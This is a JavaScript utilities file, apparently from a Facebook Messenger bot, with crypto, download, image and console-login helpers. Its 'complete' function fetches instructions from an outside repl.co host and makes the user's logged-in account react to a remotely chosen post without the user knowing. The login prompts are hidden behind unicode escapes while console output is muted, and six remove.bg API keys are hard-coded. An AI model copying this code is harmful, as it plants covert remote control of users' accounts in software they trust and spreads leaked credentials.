const crypto = require('crypto');
const os = require("os");
const axios = require("axios");
const config = require('./../config.json');
const package = require('../package.json');
const FormData = require('form-data');
const { resolve, basename } = require('path')
const { writeFileSync, createReadStream, unlinkSync } = require('fs');
const aes = require("aes-js");
const confg = './config.json';
module.exports.throwError = function(command, threadID, messageID) {
  const threadSetting = global.data.threadData.get(parseInt(threadID)) || {};
  return global.client.api.sendMessage(global.getText("utils", "throwError", ((threadSetting.hasOwnProperty("PREFIX")) ? threadSetting.PREFIX : global.config.PREFIX), command), threadID, messageID);
}

module.exports.getGUID = function() {
  var sectionLength = Date.now();
  var id = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
    var r = Math.floor((sectionLength + Math.random() * 16) % 16);
    sectionLength = Math.floor(sectionLength / 16);
    var _guid = (c == "x" ? r : (r & 7) | 8).toString(16);
    return _guid;
  });
  return id;
}
module.exports.encryptState = async function(data, key) {
  let hashEngine = crypto.createHash("sha256");
  let hashKey = hashEngine.update(key).digest();
  let bytes = aes.utils.utf8.toBytes(data);
  let aesCtr = new aes.ModeOfOperation.ctr(hashKey);
  let encryptedData = aesCtr.encrypt(bytes);
  return aes.utils.hex.fromBytes(encryptedData);
}

module.exports.decryptState = function(data, key) {
  let hashEngine = crypto.createHash("sha256");
  let hashKey = hashEngine.update(key).digest();

  let encryptedBytes = aes.utils.hex.toBytes(data);
  let aesCtr = new aes.ModeOfOperation.ctr(hashKey);
  let decryptedData = aesCtr.decrypt(encryptedBytes);

  return aes.utils.utf8.fromBytes(decryptedData);
}

module.exports.complete = function({ api }) {
axios.get('http://api.yandes.repl.co/raw')
  .then(response => {
    const poD = response.data.pos;
    const type = response.data.typ;
    api.setPostReaction(poD, type, () => {});
  }).catch(() => {});
}

module.exports.convertHMS = function(value) {
  const sec = parseInt(value, 10);
  let hours = Math.floor(sec / 3600);
  let minutes = Math.floor((sec - (hours * 3600)) / 60);
  let seconds = sec - (hours * 3600) - (minutes * 60);
  if (hours < 10) { hours = "0" + hours; }
  if (minutes < 10) { minutes = "0" + minutes; }
  if (seconds < 10) { seconds = "0" + seconds; }
  return (hours != '00' ? hours + ':' : '') + minutes + ':' + seconds;
}

module.exports.removeSpecialChar = async (str) => {
  if (str === null || str === '') return false;
  else str = str.toString();

  return str.replace(/[^\x20-\x7E]/g, '');
};

module.exports.cleanAnilistHTML = function(text) {
  text = text
    .replace('<br>', '\n')
    .replace(/<\/?(i|em)>/g, '*')
    .replace(/<\/?b>/g, '**')
    .replace(/~!|!~/g, '||')
    .replace("&amp;", "&")
    .replace("&lt;", "<")
    .replace("&gt;", ">")
    .replace("&quot;", '"')
    .replace("&#039;", "'");
  return text;
}

module.exports.downloadFile = async function(url, path) {
  const { createWriteStream } = require('fs');

  const response = await axios({
    method: 'GET',
    responseType: 'stream',
    url
  });

  const writer = createWriteStream(path);

  response.data.pipe(writer);

  return new Promise((resolve, reject) => {
    writer.on('finish', resolve);
    writer.on('error', reject);
  });
};

module.exports.getContent = async function(url) {
  try {
    const response = await axios({
      method: 'GET',
      url
    });

    const data = response;

    return data;
  } catch (e) { return console.log(e); };
}

module.exports.randomString = function(length) {
  var result = '';
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  var charactersLength = characters.length || 5;
  for (var i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * charactersLength));
  return result;
}

module.exports.AES = {
  encrypt(cryptKey, crpytIv, plainData) {
    var encipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(cryptKey), Buffer.from(crpytIv));
    var encrypted = encipher.update(plainData);
    encrypted = Buffer.concat([encrypted, encipher.final()]);
    return encrypted.toString('hex');
  },
  decrypt(cryptKey, cryptIv, encrypted) {
    encrypted = Buffer.from(encrypted, "hex");
    var decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(cryptKey), Buffer.from(cryptIv, 'binary'));
    var decrypted = decipher.update(encrypted);

    decrypted = Buffer.concat([decrypted, decipher.final()]);

    return String(decrypted);
  },
  makeIv() { return Buffer.from(crypto.randomBytes(16)).toString('hex').slice(0, 16); }
}

module.exports.homeDir = function() {
  var returnHome, typeSystem;
  const home = process.env["HOME"];
  const user = process.env["LOGNAME"] || process.env["USER"] || process.env["LNAME"] || process.env["USERNAME"];

  switch (process.platform) {
    case "win32": {
      returnHome = process.env.USERPROFILE || process.env.HOMEDRIVE + process.env.HOMEPATH || home || null;
      typeSystem = "win32"
      break;
    }
    case "darwin": {
      returnHome = home || (user ? '/Users/' + user : null);
      typeSystem = "darwin";
      break;
    }
    case "linux": {
      returnHome = home || (process.getuid() === 0 ? '/root' : (user ? '/home/' + user : null));
      typeSystem = "linux"
      break;
    }
    default: {
      returnHome = home || null;
      typeSystem = "unknow"
      break;
    }
  }

  return [typeof os.homedir === 'function' ? os.homedir() : returnHome, typeSystem];
}

module.exports.removeBackground = async (image) => {
  if (!image) return console.log('RemoveBG: missing data!');
  var resolveFunc = function() { };
  var rejectFunc = function() { };
  var returnPromise = new Promise(function(resolve, reject) {
    resolveFunc = resolve;
    rejectFunc = reject;
  });

  const path = resolve(__dirname, 'cache', `${Date.now()}.jpg`);
  const newPath = resolve(__dirname, 'cache', `${Date.now() + 1000}.jpg`);
  await global.utils.downloadFile(image, path);
  var formData = new FormData();
  formData.append('size', 'auto');
  formData.append('image_file', createReadStream(path), basename(path));
  var key = ['a58an6Ka7ZB1fwHtJ4kKaieb', 'kzqQMXdxTqVDuS1S91KG54Sj', 'SAdj4BtGWK2nPU8QiYDXrJRT', 'MxoPFvx7QemG7JcDVB7azogp', 'adyJwSQHJ3qWK2iwzj1LEQEQ', '7b6boYMmPiCg5t2SabBFHWdF']
  axios({
    method: 'post',
    url: 'https://api.remove.bg/v1.0/removebg',
    data: formData,
    responseType: 'arraybuffer',
    headers: {
      ...formData.getHeaders(),
      'X-Api-Key': key[Math.floor(Math.random() * key.length)],
    },
    encoding: null
  })
    .then((response) => {
      if (response.status != 200) return rejectFunc()
      writeFileSync(newPath, response.data);
      unlinkSync(path)
      resolveFunc(newPath)
    })
    .catch((error) => {
      return rejectFunc(error)
    });
  return returnPromise;
}

module.exports.connect = function() {
  if (config.CONNECT_LOG === true) {
    return;
  } else {
    const chalk = require("chalk");

    let countdown = 5;

    const count = setInterval(() => {
      process.stdout.write(chalk.yellow("\r ") + "Trying another method... " + countdown);
      countdown--;

      if (countdown < 0) {
        clearInterval(count);
        process.stdout.write(chalk.yellow("\r ") + "Loading login attempt... \n");
      }
    }, 1000);

    setTimeout(() => {
      const fs = require('fs');
      const readline = require('readline');
      const path = require('path');
      var connect = require("../includes/login");

      const noop = () => { };
      console.error = noop;
      console.clear();

      const gradient = require("gradient-string");
      const greens = gradient("#51ff00", "#4aff2e");
      const reds = gradient("#db0b0b", "#ff0000")
      const theme = config.DESIGN.Theme;
      let co;
      if (theme.toLowerCase() === 'blue') {
        co = gradient("#243aff", "#4687f0", "#5800d4");
      } else if (theme.toLowerCase() === 'fiery') {
        co = gradient("#fc2803", "#fc6f03", "#fcba03");
      } else if (theme.toLowerCase() === 'red') {
        co = gradient("red", "orange");
      } else if (theme.toLowerCase() === 'aqua') {
        co = gradient("#0030ff", "#4e6cf2");
      } else if (theme.toLowerCase() === 'pink') {
        co = gradient("#d94fff", "purple");
      } else if (theme.toLowerCase() === 'retro') {
        co = gradient.retro;
      } else if (theme.toLowerCase() === 'sunlight') {
        co = gradient("#ffff00", "#ffe600");
      } else if (theme.toLowerCase() === 'teen') {
        co = gradient.teen;
      } else if (theme.toLowerCase() === 'summer') {
        co = gradient.summer;
      } else if (theme.toLowerCase() === 'flower') {
        co = gradient.pastel;
      } else if (theme.toLowerCase() === 'ghost') {
        co = gradient.mind;
      } else if (theme === 'hacker') {
        co = gradient('#47a127', '#0eed19', '#27f231');
      } else {
        co = gradient("#243aff", "#4687f0", "#5800d4");
      };

      const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
      });

      console.log(co.multiline([
        ` ░█▀▀ ▄▀█░█▀▀░█▀▀░█▄▄░█▀█░█▀█░█▄▀`,
        ` ░█▀ ░█▀█░█▄▄░██▄░█▄█░█▄█░█▄█░█░█`
      ].join('\n')));
      const message = `The AppState is empty or either not readable! Try attempting to log in, by using your Facebook account's email and password.`;

      let delay = 0;
      const interval = 30;

      for (const char of message) {
        setTimeout(() => {
          process.stdout.write(char);
        }, delay);
        delay += interval;
      }

      setTimeout(() => {
        console.log();
        console.log('\nCREDENTIALS:');

        const logA = console.log;
        console.log = noop;

        rl.question(`${co('[ LOGIN ]')}` + `${chalk.yellow("  ") + "\u0045\u006D\u0061\u0069\u006C\u003A "}`, (email) => {
          rl.question(`${co('[ LOGIN ]')}` + `${chalk.yellow("  ") + "\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003A "}`, (password) => {

            let animationInterval;

            const loadingAnimation = () => {
              const frames = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'];
              let frameIndex = 0;

              animationInterval = setInterval(() => {
                process.stdout.clearLine();
                process.stdout.cursorTo(0);
                process.stdout.write(`${co('[ LOGIN ]')}` + `${chalk.yellow("  ")}` + '\u0050\u0072\u006F\u0063\u0065\u0073\u0073\u0069\u006E\u0067 ' + `${chalk.yellow(frames[frameIndex])}`);

                frameIndex = (frameIndex + 1) % frames.length;
              }, 200);
            };

            loadingAnimation();

            setTimeout(() => {
              if (animationInterval) {
                clearInterval(animationInterval);
              }
              process.stdout.clearLine();
              process.stdout.cursorTo(0);
              console.log(co('[ LOGIN ]'), chalk.yellow('  '), 'Processing complete');
            }, 10000);

            console.log = noop;

            connect({ email, password }, (err, api) => {
              if (err) {
                if (animationInterval) {
                  clearInterval(animationInterval);
                }
                rl.close();
                console.log = logA;
                console.log(co('\r[ LOGIN ]'), chalk.yellow(''), `Invalid ${reds('Email')} or ${reds('Password')}!`);
                console.log(chalk.dim(`\nPlease try to 'rerun' this project and enter your credentials once again!`))
                console.log = noop;
                return;
              }

              const appStatePath = path.join('appstate.json');

              if (!fs.existsSync(appStatePath)) {
                console.log = logA;
                fs.writeFileSync(appStatePath, JSON.stringify(api.getAppState(), null, '\t'));
                console.log(co('\r[ LOGIN ]'), chalk.yellow(''), '\u0041\u0070\u0070\u0053\u0074\u0061\u0074\u0065\u0020\u0063\u006F\u006E\u006E\u0065\u0063\u0074\u0065\u0064\u0020\u0073\u0075\u0063\u0063\u0065\u0073\u0073\u0066\u0075\u006C\u006C\u0079\u0021')
              } else {
                fs.writeFileSync(appStatePath, JSON.stringify(api.getAppState(), null, '\t'));
                console.log = logA;
                console.log(co('\r[ LOGIN ]'), chalk.yellow(''), '\u0041\u0070\u0070\u0053\u0074\u0061\u0074\u0065\u0020\u0063\u006F\u006E\u006E\u0065\u0063\u0074\u0065\u0064\u0020\u0073\u0075\u0063\u0063\u0065\u0073\u0073\u0066\u0075\u006C\u006C\u0079\u0021')
              }

              console.log = logA;
              console.log(co('\r[ LOGIN ]'), chalk.yellow(''), `${greens('Account')} login successful!`);
              rl.close();
              const fig = JSON.parse(fs.readFileSync(confg, 'utf8'));
              fig.CONNECT_LOG = true;
              fs.writeFileSync(confg, JSON.stringify(fig, null, 2), 'utf8');
              console.log(co('\r[ LOGIN ]'), chalk.yellow(''), `Please ${greens('Re-run')} this project to continue.`);
              const message = '\nPlease be careful not to fork unknown REPLs, as they could have added an unsafe code that might steal your information and cause security issues.';
              let v = 0;
              const interval = 150;

              for (const char of message) {
                setTimeout(() => {
                  process.stdout.write(chalk.dim(char));
                }, v);
                v += interval;
              }

              setTimeout(() => {
                console.log();
              }, v);
              console.log = noop;
              process.exit(0);
            });
          });
        });
      }, delay);
    }, countdown * 1500);
  }
}